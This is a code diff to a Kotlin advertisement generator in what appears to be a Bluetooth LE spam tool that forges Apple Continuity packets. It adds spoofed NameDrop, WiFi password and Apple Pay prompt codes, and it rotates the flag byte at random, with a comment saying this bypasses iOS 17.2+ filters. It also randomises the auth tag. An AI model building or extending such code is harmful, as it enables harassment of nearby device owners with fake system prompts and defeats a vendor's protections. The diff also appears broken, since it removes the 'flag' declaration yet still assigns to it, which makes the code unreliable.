@@ -42,6 +42,10 @@ class  ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerato
         "24" to "Apple Vision Pro",
         "2F" to "Connect to other Device",
         "21" to "Software Update",
+        "12" to "NameDrop / Contact Share",
+        "08" to "WiFi Password Share",
+        "0C" to "Apple Pay prompt",
+        "10" to "Call Ended / Activity",
     )
 
     companion object {
@@ -51,27 +55,14 @@ class  ContinuityActionModalAdvertisementSetGenerator: IAdvertisementSetGenerato
                     var payload =
                         advertisementSet.advertiseData.manufacturerData[0].manufacturerSpecificData
                     // Example Payload: 0f05bf2078ef39000010f7c0e5
-                    val action = payload[3]
-                    var flag = payload[2]
-
-                    // Change flag from time to time
-                    if ((StringHelpers.byteToHexString(action) == "20") && Random.nextBoolean()) {
-                        flag = StringHelpers.decodeHex("BF")[0]
-                    }
-
-                    // Change flag from time to time
-                    if ((StringHelpers.byteToHexString(action) == "09") && Random.nextBoolean()) {
-                        flag = StringHelpers.decodeHex("40")[0]
-                    }
-
-                    // Change flag each time
-                    if ((StringHelpers.byteToHexString(action) == "21")) {
-                        flag = StringHelpers.decodeHex("40")[0]
-                    }
+                    // Change flag dynamically each cycle to bypass iOS 17.2+ filters
+                    // Rotating between C0, BF, 40 etc. makes every packet look "new"
+                    val flagOptions = listOf("C0", "BF", "40", "00", "75")
+                    flag = StringHelpers.decodeHex(flagOptions.random())[0]
 
                     payload[2] = flag
 
-                    // randomize auth tag
+                    // randomize auth tag (3 bytes starting at index 4)
                     payload[4] = Random.nextBytes(1)[0]
                     payload[5] = Random.nextBytes(1)[0]
                     payload[6] = Random.nextBytes(1)[0]
